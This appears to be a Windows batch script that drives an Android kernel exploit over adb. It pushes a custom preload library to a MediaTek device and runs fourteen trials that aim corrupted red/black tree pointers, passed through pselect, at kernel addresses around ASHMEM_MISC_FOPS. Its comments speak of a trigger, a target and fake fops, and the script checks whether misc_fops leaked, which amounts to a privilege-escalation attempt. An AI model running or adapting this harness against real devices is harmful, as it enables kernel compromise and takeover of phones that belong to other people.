@echo off
cd /d C:\Users\13546\Desktop\platform-tools_r33.0.2-windows\platform-tools
echo ====== v23 tree_pc scan around ASHMEM_MISC_FOPS ======
echo.

adb push C:\Users\13546\Desktop\preload_mtk_v23.so /data/local/tmp/preload.so
adb shell chmod 0644 /data/local/tmp/preload.so

echo [1/14] tree_pc=FOPS-16 (ashmem_off|RED) - v18 trigger
adb shell "PSELECT_TREE_PC=ffffff80028e76d9 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10" 2>&1 > C:\Users\13546\Desktop\v23_scan_01.txt

echo [2/14] tree_pc=FOPS-8 |RED - v22 direct target
adb shell "PSELECT_TREE_PC=ffffff80028e76e1 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10" 2>&1 > C:\Users\13546\Desktop\v23_scan_02.txt

echo [3/14] tree_pc=FOPS |RED - fops itself as parent
adb shell "PSELECT_TREE_PC=ffffff80028e76e9 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10" 2>&1 > C:\Users\13546\Desktop\v23_scan_03.txt

echo [4/14] tree_pc=FOPS+8 |RED
adb shell "PSELECT_TREE_PC=ffffff80028e76f1 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10" 2>&1 > C:\Users\13546\Desktop\v23_scan_04.txt

echo [5/14] tree_pc=FOPS+16 |RED
adb shell "PSELECT_TREE_PC=ffffff80028e76f9 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10" 2>&1 > C:\Users\13546\Desktop\v23_scan_05.txt

echo [6/14] tree_pc=FOPS-24 |RED
adb shell "PSELECT_TREE_PC=ffffff80028e76d1 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10" 2>&1 > C:\Users\13546\Desktop\v23_scan_06.txt

echo [7/14] tree_pc=FOPS-32 |RED
adb shell "PSELECT_TREE_PC=ffffff80028e76c9 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10" 2>&1 > C:\Users\13546\Desktop\v23_scan_07.txt

echo [8/14] combo: tree=FOPS-16 pi=FOPS-8 (trigger+target split)
adb shell "PSELECT_TREE_PC=ffffff80028e76d9 PSELECT_TREE_LEFT=0 PSELECT_PI_PARENT=ffffff80028e76e1 PSELECT_PI_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10" 2>&1 > C:\Users\13546\Desktop\v23_scan_08.txt

echo [9/14] combo: tree=FOPS-8 pi=FOPS-16 (reversed)
adb shell "PSELECT_TREE_PC=ffffff80028e76e1 PSELECT_TREE_LEFT=0 PSELECT_PI_PARENT=ffffff80028e76d9 PSELECT_PI_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10" 2>&1 > C:\Users\13546\Desktop\v23_scan_09.txt

echo [10/14] Path A: tree_left=fake_fops tree_right=0 (diff erase path)
adb shell "PSELECT_TREE_PC=ffffff80028e76d9 PSELECT_TREE_RIGHT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10" 2>&1 > C:\Users\13546\Desktop\v23_scan_10.txt

echo [11/14] tree_pc=FOPS-16 BLACK (RED=0)
adb shell "PSELECT_TREE_PC=ffffff80028e76d8 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10" 2>&1 > C:\Users\13546\Desktop\v23_scan_11.txt

echo [12/14] PSELECT_TARGET=pselect tree_pc=FOPS-16
adb shell "PSELECT_TARGET=pselect PSELECT_TREE_PC=ffffff80028e76d9 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10" 2>&1 > C:\Users\13546\Desktop\v23_scan_12.txt

echo [13/14] PSELECT_TARGET=pselect tree_pc=FOPS-8
adb shell "PSELECT_TARGET=pselect PSELECT_TREE_PC=ffffff80028e76e1 PSELECT_TREE_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10" 2>&1 > C:\Users\13546\Desktop\v23_scan_13.txt

echo [14/14] pi_tree full: both trees set to v18 trigger
adb shell "PSELECT_TREE_PC=ffffff80028e76d9 PSELECT_TREE_LEFT=0 PSELECT_PI_PARENT=ffffff80028e76d9 PSELECT_PI_LEFT=0 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 10" 2>&1 > C:\Users\13546\Desktop\v23_scan_14.txt

echo.
echo ====== SCAN DONE ======
echo Look for "ret=" ^> 0 and "misc_fops=" != 0 in output files
echo.
pause
